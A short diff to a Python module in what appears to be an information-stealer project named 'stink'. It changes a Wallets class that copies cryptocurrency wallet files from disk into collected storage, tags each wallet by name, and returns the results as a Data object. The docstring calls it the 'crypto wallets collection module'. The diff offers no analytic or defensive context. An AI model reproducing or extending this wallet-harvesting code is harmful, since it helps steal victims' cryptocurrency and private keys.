@@ -1,8 +1,8 @@
 from os import path
-from typing import List
 
 from stink.helpers import MemoryStorage
 from stink.helpers.config import WalletsConfig
+from stink.helpers.dataclasses import Data
 
 
 class Wallets:
@@ -34,8 +34,9 @@ class Wallets:
                 continue
 
             self.__storage.add_from_disk(wallet["path"], path.join(self.__folder, wallet["name"]))
+            self.__storage.add_data("Wallets", wallet["name"])
 
-    def run(self) -> List:
+    def run(self) -> Data:
         """
         Launches the crypto wallets collection module.
 
